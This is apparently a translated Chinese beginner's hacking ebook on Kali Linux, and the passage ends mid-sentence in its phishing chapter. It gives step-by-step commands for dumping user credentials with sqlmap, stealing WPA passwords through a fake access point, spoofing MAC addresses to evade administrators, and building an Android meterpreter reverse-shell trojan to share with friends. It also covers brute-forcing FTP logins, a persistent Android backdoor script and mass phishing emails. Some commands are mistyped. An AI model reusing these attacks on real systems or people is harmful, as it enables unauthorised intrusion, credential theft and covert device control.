- "# Hacking：Kali Linux 渗透测试：初学者指南\n\n\n\n\n\n\n\n\n\n## 免责声明\n\n尽管我们已尽力验证书中提供的所有信息，但作者对书中包含的错误、遗漏或对主题内容的相反解释不承担任何责任。书中提供的信息仅供教育和娱乐之用。读者对其自己的行为负责，作者对使用这些信息而导致的任何实际或感知的责任或损害不承担任何责任。\n\
  \n书中使用的商标均未经任何许可，且商标的发布未获得商标所有者的许可或支持。书中的所有商标和品牌仅用于说明目的，归其所有者所有，与本文档无关联。\n\n# 引言\n\
  \n渗透测试是一种很好的技术，可以帮助你保持系统安全。它可以帮助你识别系统中的任何漏洞或弱点（通常称为漏洞）。在系统部署到生产环境之前，尽早检测这些漏洞总是好的，有助于保持安全。一旦检测到这些漏洞，你就可以进行封堵。这表明了对系统进行渗透测试的重要性。Kali\
  \ Linux 是渗透测试的最佳操作系统。本书将指导你如何进行操作！\n\n# 第 1 章- 使用 Sqlmap 破解网站\n\nSqlmap 仅仅一个让我们轻松进行\
  \ SQL 注入的工具。该工具是开源的，可用于渗透测试，实现检测和利用 SQL 注入漏洞的自动化，进而接管数据库服务器。\n\n## 该工具具有非常强大的检测引擎以及其他可用于渗透测试的工具。你可以使用该工具进行数据库指纹、从数据库获取数据、访问文件系统以及在你的操作系统上执行命令。\n\
  \n## Sqlmap 完全支持 Oracle、MySQL、PostgreSQL、Microsoft Access、IBM DB2、Firebird、Sybase、SQLite\
  \ SAP MaxDB 和 Microsoft SQL Server 数据库管理系统。这意味着几乎支持所有可用数据库管理系统。\n\n## 在本章中，我们将展示如何在\
  \ Kali Linux 中使用 Sqlmap 破解网站。可以通过以下步骤实现：启动运行 Kali Linux 的机器。打开终端，输入以下命令：\n\n```bash\n\
  sqlmap -h\n```\n\n将列出 SqlMap 支持的所有基本命令。我们可以从执行一个简单的命令开始，指定要注入的 URL。如下所示。它应该采用以下语法：\n\
  \n```bash\nsqlmap -u <要注入的 URL>\n```\n\n在我们的案例中，命令所示：\n\n```bash\nsqlmap -u http://testphp.productweb.com/showproducts.php?cat=1\n\
  ```\n\n有时，服务器的响应可能会很慢。在这种情况下，我们可以使用 `--time-sec`，这将有助于加速服务器的响应。可以像下面的命令所示添加：\n\n\
  ```bash\nsqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 --time-sec\
  \ 15\n```\n\n一旦完成上述命令，你将被你正在使用的 MySQL 版本以及有关你系统的相关信息。\n\n注意，在执行命令时，系统可能会提示你回答是或否，这由作者决定。\n\
  \n### 数据库\n\n我们想要获取数据库名称。首先，我们将使用 `--dbs` 选项列出数据库。如下：\n\n```bash\nsqlmap -u http://testphp.productweb.com/showproducts.php?cat=1\
  \ --dbs\n```\n\n### 表\n\n我们对表感兴趣。我们将使用 `--tables` 选项列出表。你的命令应该如下：\n\n```bash\nsqlmap\
  \ -u http://testphp.productweb.com/showproducts.php?cat=1 -D acuart --tables\n```\n\
  \n### 数据\n\n我们现在应该从更多列中获取数据。我们仍然使用 `-D` 指定数据库，`-T` 指定表，`-C` 指定列。\n\n```bash\nsqlmap\
  \ -u http://testphp.productweb.com/showproducts.php?cat=1 -D acuart -T users -C\
  \ email,name,pass --dump\n```\n\n# 第 2 章- 如何在不暴力破解的情况下破解 WPA/WPA2\n\nFluxion 是一个基于\
  \ linset 的脚本。事实上，它是后者的改进，修复了一些错误并提供了一些额外的选项。此工具应仅在你拥拥的网络上使用。\n\n## Fluxion\n\n为了获取该脚本，你需要克隆\
  \ GitHub 仓库。可以使用 `git` 命令行工具执行此操作，所示：\n\n```bash\ngit clone https://github.com/deltaxflux/fluxion\n\
  ```\n\n## 运行脚本\n\n现在你已经手动下载了脚本，可以导航到存储它们的目录。在这种情况下，你只需要使用 `cd` 命令切换到 fluxion 目录。所示：\n\
  \n```bash\ncd fluxion\n```\n\n然后你可以使用 sudo 权限运行脚本。以下命令演示了这一点：\n\n```bash\nsudo ./fluxion\n\
  ```\n\n### 依赖项\n\n\n\n\n对于任何有未满足依赖项的用户，你必须运行下面的脚本：\n\n```bash\nsudo ./Installer.sh\n\
  ```\n\n然而，你应该注意，上述命令可能会干扰你的系统设置，这就是为什么在运行上述命令后，你应该将文件 `/etc/apt/sources.list` 的设置恢复为正常，并移除任何前沿（bleeding\
  \ edge）仓库。\n\n现在未满足的依赖项将从系统中移除，使用 `Fluxion` 将变得简单。对于那些需要使用 `apt-get` 来安装缺失项目的人，请注意\
  \ Kali Linux 仓库不会包含所有这些内容，这意味着你必须允许此脚本代表你进行安装，或者手动将仓库添加到 `/etc/apt/sources.list.\
  \ ` 文件中。再次运行以下命令：\n\n```bash\nsudo ./fluxion\n```\n\n现在命令应该可以正常运行了，提出的问题也应该是简单的。在无线适配器的情况下，选择你想要进行监控的某一个。对于通道的问题，除非你心中有特定的通道（这通常被称为目标\
  \ AP），否则只需选择所有问题即可。\n\n在此之后，你将看到 `airodump-ng` 窗口，这通常被称为 WiFi 监控器。让它运行以寻找客户端和 AP。当你确认已经获取了所需内容，只需关闭窗口即可停止监控过程。随后将发生以下情况：\n\
  \n* 你将会被提示选择目标。\n* 接着你将会被提示选择攻击。\n* 然后你会被要求提供握手（handshake）。\n* 如果你还没有捕获到握手，你的脚本将帮助你捕获一个。它将发送一些去认证包（deauth\
  \ packets）来实现这一点。\n* 完成后，你可以退出程序。\n\n## 获取无线网络密码\n\n我们想要欺骗手机连接到某些假的 AP（访问点），以便我们可以获取无线网络的密码。当手机上输入密码时，我们将查看\
  \ Kali Linux 机器上的 `Fluxion` 实例是否会获取该密码。为了握手，该手机也会被进行去认证。请按照下面提供的步骤操作：\n\n运行 `Fluxion`\
  \ 工具并选择语言：\n\n![](img/00001.jpeg)\n\n我使用的是笔记本电脑的内置网卡。事实上，某些内置网可能会有问题，这就是为什么建议你使用外部网卡。对于在虚拟机上运行\
  \ Kali Linux 的用户，你必须使用外部网卡。\n\n`airodump-ng` 工具将开始扫描过程，你会被提示选择目标。你应该选择你的手机已连接的网络编号。然后你会被提示选择一种攻击。\n\
  \n你可以通过输入相应的数字来选择攻击类型。在上面的例子，我通过输入 `1` 选择了 Hostapd 攻击。如果你已经捕获了 4 路握手，你可以指定该握手的位置，你的脚本将继续使用它。\n\
  \n如果你还没有完成握手，那么你可以选择你将要使用的工具。在这种情况下，我们将使用 `aircrack-ng`。选择可以如下所示：\n\n![](img/00002.jpeg)\n\
  \n一旦捕获了握手，你可以输入 `1` 来检查握手。如果你发现一切运行顺利，那么就可以进入下一步了。\n\n我们将使用 Web 界面方法。大多数人喜欢使用暴力破解（Bruteforce）方法，但这不是我们在这种情况下要使用的方法。\n\
  \n![](img/00003.jpeg)\n\n你必须输入 `1` 来选择 Web 界面方法。会有多个登录页面用于获取网络的 WPA 密码。\n\n![](img/00004.jpeg)\n\
  \n让我们通过输入 `1` 选择第一个选项。一旦你做出了决定，将显示多个窗口。DNS 和 DHCP 窗口将在左侧两个窗口中处理，而右侧的两个窗口负责报告状态和去认证窗口（将用户从真实的\
  \ AP 引诱到假的 AP）。一旦你与假 AP 建立了连接，你将看到 DHCP 和 DNS 窗口立即响应。\n\n与网络建立连接后，可能会提示你登录。对于你们某些人，可能需要打开浏览器并访问一个网站，你会看到必要的页面出现。只需输入密码并点击提交，脚本会将你的密码与之前捕获的握手进行验证，以确定其是否正确。\n\
  \n握手只需帮助我们验证假 AP 客户端提交的密码是否正确。如果没有握手，这种能力将会丢失，但如果我们假设客户端会提供正确的密码，我们就能实现目标。我们随后获得了受\
  \ WPA-2 保护的网络密码！\n\n# 第 3 章 检查 IP 地址位置\n\n你可以在 Kali Linux 机器上学习本地和外部 IP 地址。确定此 IP\
  \ 地址最简单的方法是使用网络浏览器。网上有很多网站可以告诉你机器的 IP 地址，例如 `linuxconfig.org`。\n\n你也可以使用命令行来获取你的外部\
  \ IP 地址。在这种情况下，你应该使用 `curl` 或 `wget` 命令。右键点击你机器的桌面并选择“打开终端”。然后你可以运行以下命令来获取外部 IP\
  \ 地址：\n\n```bash\necho $(wget -qO - https://ipify.org)\n```\nOR\n```bash\necho $(curl\
  \ -s https://ipify.org)\n```\n\n此外，了解 Kali Linux 机器的内部 IP 地址也是好的。在这种情况下，你可以使用 `ip`\
  \ 或 `ifconfig` 命令。如下所示：\n\n```bash\nifconfig | grep -w inet | awk '{ print $2}'\n\
  ```\nOR\n```bash\nip a | grep -w inet | awk '{ print $2}'\n```\n\n尽管如此，你仍然可以某些 IP\
  \ 地址的地理位置。让我们演示如何做到：\n\n启动你的 Kali Linux 系统。在这种情况下，我们将使用 MaxMind 数据库来确定 IP 地址的位置。这是一个拥有所有\
  \ IP 地址数据库的公司。你可以使用它的数据库来学习特定 IP 地址的 GPS 坐标、区代码、邮政编码和国家。\n\nKali Linux 系统启动后，继续使用\
  \ `wget` 命令下载 MaxMind 数据库。你只需要运行以下命令：\n\n```bash\nwget -N -q http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz\n\
  ```\n\n命令将为你下载数据库。注意，数据库是以压缩格式下载的，这需要你解压。可以使用如下所示的 `gunzip` (`gzip`) 命令进行解压：\n\n\
  ```bash\ngzip -d GeoLiteCity.dat.gz\n```\n\n要查看数据库是否可用，你可以列出目录中的可用内容。如下所示：\n\n```bash\n\
  ls -alh GeoLiteCity.dat\n```\n\n数据库应该是目录内容的一部分。一个通常称为 `Pygeoip` 的 Python 脚本用于读取数据库。我们现在应该下载并安装这个工具。我们将使用\
  \ `wget` 命令下载这个工具，如下：\n\n```bash\nwget http://pygeoip.googlecode.com/files/pygeoip-0.1.3.zip\n\
  ```\n\n此外，该文件以压缩格式提供，这需要使用 `unzip` 命令解压文件，如给出的命令所示：\n\n```bash\nunzip pygeoip-0.1.3.zip\n\
  ```\n\n\n\n现在我们已经有了 `pygeoip` 目录，我们应该下载一些安装工具并将它们保留在此目录中。首先，让我们使用切换目录命令进入到 `pygeoip`\
  \ 目录：\n\n```\ncd /pygeoip-0.1.3\n```\n\n然后可以使用以下两个命令下载我们需要的安装工具：\n\n```bash\nkali\
  \ > wget http://svn.python.org/projects/sandbox/trunk/setuptools/ez_setup.py\nkali\
  \ > wget http://pypi.python.org/packages/2.5/s/setuptools-0.6c11-py2.5.egg\n```\n\
  \n随后，我们可以继续移动并安装我们的安装工具。下文所示：\n\n```bash\nkali > mv setuptools-0.6c11-py2.5.egg\
  \ setuptools-0.7a1-py2.5.egg\nkali > python setup.py build\nkali > python setup.py\
  \ install\n```\n\n我们现在的目标是将数据库移动到 `pygeoip` 目录，这样我们的脚本就可以访问它，而无需使用完整路径。运行以下命令即可完成：\n\
  \n```bash\nkali > mv GeoLiteCity.dat /pygeoip-0.1.3/GeoLiteCity.dat\n```\n\n现在我们已经准备好了数据库并安装了\
  \ `pygeoip` 脚本，可以开始查询数据库了。首先，运行以下命令打开 python 解释器：\n\n```bash\nkali > python\n```\n\
  \n当你看到三个大于号 `>>>` 时，就说明你当前正在运行 Python 的交互式外壳。我们将导入 `pygeoip` 模块，然后创建一个类实例。操作如下：\n\
  \n```python\n>>> import pygeoip\n>>> gip = pygeopip.GeoIP('GeoLiteCity.dat')\n```\n\
  *(注：原文此处 pygeopip 疑为 pygeoip 的笔误，翻译时保持代码原样)*\n\n现在，我们的目标是侦查并学习 IP 地址的位置。你可以编写下面提供的脚本，它将帮助你了解\
  \ `google.com` 的位置：\n\n```python\n>>> rec = gip.record_by_addr('64.233.161.99')\n\
  >>> for key,val in rec.items():\n... print \"%s: %s\" %(key,val)\n...\n```\n\n注意\
  \ `print` 语句进行了缩进，如果没有缩进将会报错，所以请确保你的语句已缩进。此外，我们传入了 Google 的 IP 地址，该脚本将给你该 IP 的精确位置。在我的情况下，我得到了以下结果：\n\
  \n![](img/00005.jpeg)\n\n你可以看到我们获得了区域名称、地区代码、经度和国家代码，以及关于该 IP 的更多详细信息。你可以选择另一个 IP\
  \ 地址并尝试使用它，你也将获得它的精确位置。这就是 `pygeoip` 脚本和数据库强大组合的之处。\n\n# 第 4 章- MAC 地址欺骗 (MAC Address\
  \ Spoofing)\n\n`macchanger` 是一个用于更改 Linux 中 MAC 地址的工具。在 Kali Linux 中，该工具已预装，但在其他\
  \ Linux 发行版中，你需要手动安装。该工具可以帮助你伪造 `Wlan0` 和 `eth0` 等接口的 MAC 地址。\n\nMAC 代表“多媒体访问控制”（Multimedia\
  \ access control）。它是唯一标识硬件的地址。每当你连接到 WiFi 或任何其他网络时，你的设备都应该被唯一标识，这就是 MAC 地址的作用。每个设备都有唯一的\
  \ MAC 地址，且无法唯一地更改，但你可以在一段时间内对其进行伪造。\n\nMAC 地址欺骗在黑客攻击中有许多优势。通过它，你可以绕过 MAC 过滤安全限制。要连接到\
  \ WiFi 网络，你的设备必须在允许连接的设备列表中。在你的情况下，你应该绕过这种过滤。此外，如果你需要攻击某些地方的路由器，你应该伪造你的 MAC 地址 ID，以免管理员发现你并封锁你的设备。\n\
  \n在本章中，我们将指导你如何伪造 `wlan0` 接口的 MAC 地址，这对于连接无线网络很有帮助。首先，运行以下命令关闭接口：\n\n```bash\nifconfig\
  \ wlan0 down\n```\n\n现在接口已关闭，我们可以继续手动更改 MAC 地址的 ID。这需要运行以下命令：\n\n```bash\nmacchanger\
  \ –m 12:12:12:12:12:12 wlan0\n```\n\n注意，上述命令使用的地址只是一个虚假地址。这就是手动更改地址的方法。然而，你也可以自动更改地址。你只需要执行下面提供的命令即可：\n\
  \n```bash\nmacchanger -a wlan0\n```\n\n如果你需要随机更改此地址，只需将上述命令中的 `-a` 选项替换为 `-r` 选项。更改完成后，你应该重新启用接口。你只需要运行以下命令：\n\
  \n```bash\nifconfig wlan0 up\n```\n\n该命令将启动应用了新更改的 `wlan0` 接口。你可以运行以下命令来关闭欺骗状态：\n\
  \n```bash\nifconfig wlan0 down\nifconfig -p wlan0 // -p 意味着永久生效\nifconfig wlan0\
  \ up\n```\n\n这样你就更改了系统的 WiFi 地址。除了 `wlan0` 接口外，你还可以伪造用于以太网连接的 `eth0` 接口。要这样做，只需像下面所示将\
  \ `wlan0` 替换为 `eth0`：\n\n```bash\nifconfig eth0 down\nmacchanger -r eth0\nifconfig\
  \ eth0 up\n```\n\n# 第 5 章- 扫描网站漏洞\n\n在开始攻击网站之前，先对其进行扫描并识别其弱点是明智的。这将使你更容易攻击网站。\n\n\
  现有很多工具可以帮助你扫描网站漏洞。`nikto` 就是此类工具的一个示例。使用该工具时，它会扫描网站并报告你可以利用的弱点。让我们演示如何在 Kali Linux\
  \ 中使用 `nikto` 扫描网站漏洞。\n\n首先启动 Kali Linux 虚拟机。一旦运行，导航到 Kali Linux -> 漏洞分析 (Vulnerability\
  \ Analysis) -> 杂项扫描器 (Misc Scanners) -> `nikto`。该工具提供了许多选项，我们将使用下面提供的：\n\n```bash\n\
  nikto -h <IP or hostname>\n```\n\n## 扫描 Web 服务器\n\n我们将从网络中运行的一个安全服务器开始。http 服务应在另一台机器上启动。该机器没有托管任何网站，仅只是一个\
  \ Web 服务器。输入以下命令进行扫描：\n\n```bash\nnikto -h 192.168.1.104\n```\n\n`nikto` 工具将响应并提供大量信息。\n\
  \n![](img/0006.jpeg)\n\n首先，你被告知这是一个 Apache 版本 2.2.12 服务器。在下方，你可以看到报告了带有 OSVDBDB\
  \ 前缀的漏洞。这代表“开源漏洞数据库”（Open Source Vulnerability Database）。这是一个维护已知漏洞的数据库。\n\n现在是时候我们扫描网站并查看漏洞了。在这种情况下，我们将扫描一个名为\
  \ `sitescan.com` 的网站。输入以下命令：\n\n```bash\nnikto -h sitescan.com\n```\n\n再次，工具将响应大量信息。首先，它识别出服务器是\
  \ Apache，然后开始识别系统中的漏洞。注意 `OSVDB` 数据库保留在 `www.osvdb.org` 网站上，如果你需要查看上述漏洞，只需打开该网站。你可以从该网站学习更多关于该网站漏洞的知识。\n\
  \n工具识别了漏洞 `OSVDB-877`。要了解其含义，你只需将此引用编号粘贴到搜索函数中，系统就会为你检索出一个页面。\n\n然后你可以继续扫描你可能感兴趣并想要的其他网站。再次，你扫描网站的命令应该遵循下面的语法：\n\
  \n```bash\nnikto -h websitename\n```\n\n在扫描第二个站点后，`nikto` 工具给出了漏洞。如你从上面的输出所示；我们的网站使用的是微软的\
  \ IIS 8.5 服务器，而不是上一次扫描时的 Apache 服务器。工具还为我们列出了其他漏洞。\n\n\n\n然而，有时当你尝试利用漏洞时，你可能会发现它们只是假阳报（false-positives）。这背后的原因是该网站可能返回了一个无害的\
  \ 404 页面。大多数利用程序预期网站是使用 `asp` 或 `PHP` 构建的，但该网站可能并没有使用这些语言构建。\n\n假阳报通常发生是因为扫描并没有执行发现的漏洞，而是仅仅通过扫描来检查服务器是否会对已知的可利用\
  \ URL 做出无错误响应。\n\n## 扫描 Facebook\n\n我们随后可以使用 `nikto` 工具来扫描 `facebook.com`。只需运行以下命令：\n\
  \n```\nnikto -h facebook.com\n```\n\n这将提供漏洞信息。如输出所示，Facebook 已经做过安全处理，只有少数漏洞。\n\n\
  # 第 6 章 - 使用 Kali Linux 破解安卓手机\n\n你可以通过 Kali Linux 破解安卓手机。这可以通过下面给出的步骤来实现：\n\n首先启动\
  \ Kali Linux。打开终端，然后创建一些木马 `.apk` 文件。要执行此操作，请输入以下命令：\n\n```\nmspayload android/meterpreter/reverse_tcp\
  \ LHOST=192.168.0.4 R > /root/Upgrader.apk\n```\n\n注意，上述命令中的 `LHOST` 应该替换为你自己的 IP\
  \ 地址。你也可以在广域网（WAN）上破解安卓，即通过 `LHOST` 中的 IP 地址进行访问并进行端口转发。\n\n继续启动另一个终端，等待文件生成。然后你可以通过输入以下命令打开\
  \ Metasploit 控制台：\n\n```\nMsfconsole\n```\n\n![](img/00007.jpeg)\n\n现在是时候设置监听器（listener）了。加载可能需要一些时间，但一旦完成，只需使用以下命令加载你的\
  \ `multhandler`：\n\n```\nuse exploit/multi/handler\n```\n\n然后可以使用以下命令设置有效负载（payload）：\n\
  \n```\nset payload android/meterpreter/reverse_tcp\n```\n\n要设置 L host 的类型，只需运行以下命令：\n\
  \n```\nset LHOST 192.168.0.4\n```\n\n对于那些在广域网上进行破解的人，只需输入内部或私有 IP，而不要外部或公共 IP。\n\
  \n最后，你就可以输入以下命令来执行利用了：\n\n```\nExploit\n```\n\n上述命令预计将启动监听器。你可以将刚刚制作的 `Upgrader.apk`\
  \ 从你的根目录复制到安卓手机上。你可以按照需要的方式与朋友分享它，这样你就有机会利用他们的安卓手机。\n\n允许用户在他们的安卓手机上安装应用，并开启“允许安装未知来源应用”的选项。一旦打开该应用，就会出现\
  \ `meterpreter` 提示符。\n\n## 使用 Uniscan\n\n这是一个简单的本地文件包含（LFI）、远程文件包含（RFI）以及远程命令执行（RCE）漏洞扫描器。这个工具虽然简单，但在\
  \ Kali Linux 的网络扫描方面表现出色。你需要良好的互联网连接来使用此工具扫描你的网站。\n\n在使用此工具时，你可以选择使用命令行工具或图形用户界面（GUI）。要使用它，你可以将\
  \ `uniscan` 命令与下面的选项结合：\n\n- `-h` 帮助\n- `-u` `<url>` 示例：`https://www.site.com/`\n\
  - `-f` `<file>` URL 列表\n- `-b` Uniscan 后台运行\n- `-q` 启用目录检查\n- `-w` 启用文件检查\n- `-e`\
  \ 启用 robots.txt 和 sitemap.xml 检查\n- `-d` 启用动态检查\n- `-s` 启用静态检查\n- `-r` 启用压力检查\n\
  - `-i` `<dork>` Bing 搜索\n- `-o` `<dork>` Google 搜索\n- `-g` Web 指纹\n- `-j` 服务器指纹\n\
  \n要扫描网站 URL，我们使用 `-u` 选项，并通过 `-qd` 选项启用目录和动态检查。以下命令演示了这一点：\n\n```\nuniscan -u http://sitename.com/\
  \ -qd\n```\n\n该命令将列出指定 URL 网站中所有可能的漏洞。\n\n这就是你如何通过命令行扫描网站。此外，你也可以通过图形用户界面（GUI）扫描网站。首先，在终端上运行以下命令：\n\
  \n```\nuniscan-gui\n```\n\n这将启动 GUI，让你能够开始扫描所需的网站。在 GUI 情况下，你必须输入目标网站的 URL，然后你将拥有选择要在在该网站上执行的检查类型的选项。完成后，只需点击“Start\
  \ Scan”（开始扫描），网站扫描就开始了。\n\n在扫描过程中，你可能需要检查所有内容。如果是这样，你应该在命令行中输入 `uniscan` 命令并配合 `-b`\
  \ 选项。`-b` 选项的作用是在后台运行命令。考虑下面给出的示例：\n\n```\nuniscan -u test-a.blackmoreops.com –bqdw\n\
  ```\n\n一旦你知道了特定网站的漏洞，你只需要继续利用它们，你就能从网站中获得你想要的东西。\n\n# 第 7 章 - 在 Kali Linux 中破解 FTP\
  \ 服务器\n\n在大多数服务器中，开放的 FTP 容易受到攻击。人们可以使用用户名和密码进行暴力破解攻击。在本章中，我们将对开启了开放 FTP 端口的 FTP\
  \ 服务器进行暴力破解。\n\n你应该使用 `Msfconsole`，它在 Kali Linux 中已预装好。你应该准备两个字典文件（word lists）。如果你只有一个，就直接创建第二个。只需创建两个包含用户名和密码的字典文件，你就可以就绪了。\n\
  \n你可以打开 Kali Linux 机器的终端，然后运行以下命令启动 postgresql 数据库：\n\n```\nservice postgresql start\n\
  ```\n\n接下来，运行以下命令启动 Metasploit：\n\n```\nMsfconsole\n```\n\n我们首先应该找到的是目标的 IP 地址和开放的\
  \ FTP 端口。这就是为什么我们从运行 `nmap` 扫描开始，以便识别这些信息。你不需要启动另一个终端，因为 `nmap` 命令可以在 `Msfconsole`\
  \ 控制台中执行。运行下面的命令：\n\n```\nnmap -F sitename.com\n```\n\n这将给你一个类似下面的输出：\n\n```\n[*]\
  \ exec: nmap -F sitename.com\nStarting Nmap 6.49BETA ( https://nmap.org ) at\nNmap\
  \ scan report for sitename.com (192.168.251.160)\nHost is up (0.43s latency).\n\
  rDNS record for 192.168.251.160: ip-192-186-251-160\nNot shown: 88 filtered ports\n\
  PORT     STATE SERVICE\n21/tcp  open  ftp\n22/tcp  open  ssh\n```\n\n我们已经获得了目标。我们应该获取漏洞，在案例中，我们将使用\
  \ `ftp_login` 漏洞。运行下面的命令：\n\n```\nsearch ftp_login\n```\n\n这将给你一个与类似的输出：\n\n```\n\
  Matching Modules\n================\n   Name                           Disclosure\
  \ Date  Rank    Description\n   ----                                ---------------\
  \  ----    -----------\n   auxiliary/scanner/ftp/ftp_login                normal\
  \  FTP Authentication Scanner\n```\n\n上述命令的作用是开启 FTP 验证扫描器。这在案例中可以使用。下面的命令可以帮助你查找有关\
  \ ftp-login 扫描器的更多信息。你会看到可以使用漏洞的选项。这里是命令：\n\n```\ninfo auxiliary/scanner/ftp/ftp_login\n\
  ```\n\n要开始使用 ftp_login 漏洞，只需运行以下命令：\n\n```\nuse auxiliary/scanner/ftp/ftp_login\n\
  ```\n\n上述命令将带你进入 `ftp_login` 漏洞内部，只需运行下面的命令以便知道如何设置目标。你可能会对这感到困惑，因为有很多选项，但只有四个会被用到。这里是命令：\n\
  \n```\nmsf auxiliary(ftp_login) > show options\n```\n\n上述 `show options` 命令将给出如所示的选项：\n\
  \n![](img/00008.jpeg)\n\n## 设置目标\n\n\n\n\n现在是时候通过简单提供目标的 IP 地址来设置 `RHOST` 选项了。只需按所示提供网站的\
  \ IP 地址即可：\n\n```\nset RHOSTS 192.186.251.160\n```\n\n我们现在可以使用 `set threads` 命令来设置同时运行的时间或进程数。如下命令所示，这将将其设置为\
  \ 40：\n\n```\nset THREADS 40\n```\n\n然后，你应该继续设置包含用户名的文件路径。该文件是利用程序从中获取用户名进行登录的文件。你必须使用如下所示的\
  \ `set user_file` 命令：\n\n```\nset USER_FILE Desktop/usernames.txt\n```\n\n你还可以设置密码文件的路径。如下所示：\n\
  \n```bash\nmsf auxiliary(ftp_login) > set PASS_FILE Desktop/password.txt\n```\n\n\
  现在所有设置都已完成。你可以运行漏洞了。它将开始测试用户名和密码。如果找到了用户名和密码，测试将停止，并显示用户名、密码以及 `login successful`\
  \ 信息。要运行此操作，只需输入 `exploit` 命令。\n\n你也可以使用某些单个用户名。这意味着你不需要使用词汇表，而是可以使用一些常用的用户名，如 `admin`、`root`\
  \ 等。这意味着 `admin` 或 `root` 将被作为用户名，它只需要搜索密码。可以使用以下命令设置用户名：\n\n```\nset USERNAME root\n\
  ```\n\n随后 root 将成为系统中的默认用户！\n\n# 第 8 章在 Android 中创建持久化后门\n\n一旦你在 Android 中创建了后门，你就可以让它持久化。在本章中，我们将向你展示如何通过\
  \ bash 脚本来实现。接下来的步骤将帮助你实现：\n\n在这种情况下，我们将使用虚拟机在广域网（WAN）上进行攻击。首先，运行以下命令来创建后门：\n\n\
  ```\nmsfpayload android/meterpreter/reverse_tcp LHOST=182.68.42.6 R > /root/file.apk\n\
  ```\n\n之后，运行以下命令序列来设置监听器：\n\n- `msfconsole`\n- `use exploit/multi/handler`\n- `set\
  \ payload android/meterpreter/reverse_tcp`\n- `set LHOST 192.168.0.4`\n- `exploit`\n\
  \n一旦用户运行并安装了名为 `file.apk` 的文件，meterpreter 就会打开。\n\n之后，我们可以开始创建持久化脚本。以下几行代码应复制到名为\
  \ `script.sh` 的记事本文件中，同时确保不要忘记 `.sh` 扩展名，因为它非常重要。它表示我们正在创建一个 shell 文件。以下是代码行：\n\n\
  ```bash\n#!/bin/bash\nwhile true\ndo am start --user 0 -a android.intent.action.MAIN\
  \ -n com.metasploit.stage/.MainActivity\nsleep 20\ndone\n```\n\n注意，第 3 行和第 4 行实际上是同一行的延续，因此不要在两者之间添加换行符。上述脚本的第一行\
  \ `#!/bin/bash` 非常重要，因为它表示这是一个 shell 脚本。`sleep` 参数可以设置为你希望脚本睡眠的任何秒数。然后，你应该将此脚本复制到\
  \ Kali Linux 的 `Home/Root` 文件夹中。\n\n然而，我们应该更新脚本以便兼容任何 Android 系统。但请注意，你不应该复制和粘贴此脚本，而是应该自己编写，否则它可能会失效。以下是代码：\n\
  \n```bash\n#!/bin/bash\nwhile :\ndo am start --user 0 -a android.intent.action.MAIN\
  \ -n com.metasploit.stage/.MainActivity\nsleep 20\ndone\n```\n\n确保在 `while` 和 `:`\
  \ 之间留有一个空格。脚本没有多个空格，且第 3 行和第 4 行之间没有空格。\n\n## 上传脚本\n\n我们的目标是将脚本上传到被攻击的 Android 系统。脚本应该被上传到名为\
  \ `etc/init.d/` 的目录，这样即使在重启后也能保持持久化。\n\n首先，运行以下命令进入根目录：\n\n```bash\ncd /\n```\n\n\
  你将被带到根目录，为了验证这一点，你可以运行以下命令：\n\n```\nLs\n```\n\n之后，输入以下命令切换到 `/etc` 目录：\n\n```bash\n\
  cd etc\n```\n\n再次按照如下方式切换到 `init.d` 目录，然后列出目录内容：\n\n```\ncd init.d\nls\n```\n\n\
  假设你已将脚本文件保存为 `anything.sh`，你可以运行以下命令来上传它：\n\n```\nupload anything.sh\n```\n\n注意，我们需要\
  \ root 权限来完成该命令。\n\n我们需要保持应用程序持久化，直到完成重启。然而，一旦受害者的 Android 系统重启，该程序将不再保持持久化。以下命令序列可以帮助我们将脚本上传到\
  \ sd 卡上的任何地方：\n\n```bash\ncd /\ncd /sdcard/Download\nls\nupload anything.sh\n```\n\
  \n上传将完成！\n\n## 运行脚本\n\n现在你已经上传了脚本，是时候运行或执行它了。脚本的执行只需进行一次，它将自动完成剩余的任务。\n\n输入以下命令进入系统的\
  \ shell：\n\n```\nShell\n```\n\n然后你可以使用以下命令集获取脚本所在的目录：\n\n```bash\ncd /\ncd /sdcard/Download\n\
  ls\n```\n\n记得我们把脚本保存为 `anything.sh`。要执行它，运行下面提供的命令：\n\n```bash\nsh anything.sh\n\
  ```\n\n该命令将激活你系统中的脚本。你应该按 `Ctrl + C` 终止 shell。尽管你终止了 shell，你的脚本仍将保持激活并运行，所以你不需要担心。\n\
  \n你可以通过重启系统或使用任务结束器来消除脚本。此时，你已经为被攻击的 Android 系统建立了持久化后门。\n\n然而，你应该始终意识到，这种持久化将持续到系统重启为止。对于那些使用动态\
  \ IP 在某些广域网上攻击的人来说，这种持久化将持续到 IP 变化或路由器重启。如果你需要消除正在运行的脚本，必须重启 Android 系统，这适用于在 Android\
  \ 系统上进行测试的人员。\n\n如果你的 Android 系统已经 root 且你使用静态公 IP，这种持久化将永久保留在你的广域网上。对于局域网（LAN），持久化也将永久保留。\n\
  \n## 测试\n\n要进行测试，只需退出 meterpreter，然后重新设置监听器。系统会自动提示 meterpreter。你可以运行 `exploit`\
  \ 命令执行利用。\n\n## 避免 Kali Linux 中的 root 密码\n\n如果你不需要 Kali Linux Live USB 中的 root 密码来进行持久登录，将其重置为默认的\
  \ `toor`。\n\n你应该使用 `root` 命令来更改密码，编辑 `/lib/live/config/0031-root-passwords`，然后注释掉下面的行：\n\
  \nbefore: `usermod -p 'X014elvznJq7E' root`\n\nafter: `# usermod -p 'X014elvznJq7E'\
  \ root`\n\n就是这样！\n\n# 第 9 章 批量邮件攻击\n\n在钓鱼攻击或渗透测试期间，我们需要发送多封邮件。批量邮件通常发送给我们进行渗透测试的组织的员工。\n\
  \n有很多工具可以帮助你发送这些批量邮件。但对我们来说，最好的还是 Kali Linux 自带的工具，它是我们用于渗透测试的操作系统。\n\n我们将使用社会工程工具\
  \ (SET) 和 Kali Linux 来发送邮件。要开始批量邮件攻击，我们首先应该收集或获取邮件列表，你可以从正在进行渗透测试的组织收集这些邮件。\n\n\
  让我们从启动社会工程工具 (SET) 开始。只需打开操作系统的终端，然后输入以下命令：\n\n```bash\nse-toolkit\n```\n\n\n\n\
  随后你将看到 `SET` 工具被打开。它将显示图形用户界面（GUI）。由于我们需要使用社会工程工具进行攻击，只需输入 `1` 来选择第一个选项。在下一个屏幕中，选择选项\
  \ `5`，以便我们可以进行群发攻击。\n\n此外，我们将处理大量邮件。这就是为什么在下一个屏幕中，你应该选择选项 `2` 邮件批量发送器，而不是单个电子邮件地址。对于那些需要执行鱼叉式网络钓鱼攻击（spear-phish）的人来说，选项\
